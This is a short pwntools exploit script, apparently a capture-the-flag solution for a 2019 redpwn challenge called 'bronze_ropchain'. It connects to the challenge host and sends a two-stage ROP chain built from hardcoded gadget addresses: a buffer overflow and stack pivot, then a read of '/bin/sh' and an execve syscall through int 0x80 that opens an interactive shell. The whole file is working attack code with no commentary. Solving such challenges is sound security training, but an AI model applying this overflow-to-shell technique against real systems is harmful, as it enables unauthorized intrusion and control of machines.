from pwn import *

p = remote("chall.2019.redpwn.net","4004")
#p = process("./bronze_ropchain")
context.terminal = ["tmux","splitw","-h"]
context.log_level = "debug"
#gdb.attach(p,"b *0x080488E8")

read = 0x0806CE40
eax = 0x080a8e86
edx_ecx_ebx = 0x0806ef51
binsh = 0x80db500
int0x80 = 0x080495b3
ret = 0x080481b2
_IO_file_read = 0x08054340
esp = 0x0809e1b1
bss_addr = 0x080DA510
payload = "a" * 0x1c
payload += p32(_IO_file_read) + p32(edx_ecx_ebx) + p32(0x080DA498) + p32(bss_addr) + p32(0x0fffffff)
payload += p32(esp) + p32(bss_addr)
p.sendlineafter("What is your name?\n",payload)
p.send("a")
payload = ""
payload += p32(read) + p32(edx_ecx_ebx) + p32(0) + p32(binsh) + p32(0x20)
payload += p32(eax) + p32(0xb)
payload += p32(edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh)
payload += p32(int0x80)
p.send(payload)
raw_input()
p.send("/bin/sh\x00")
p.interactive()
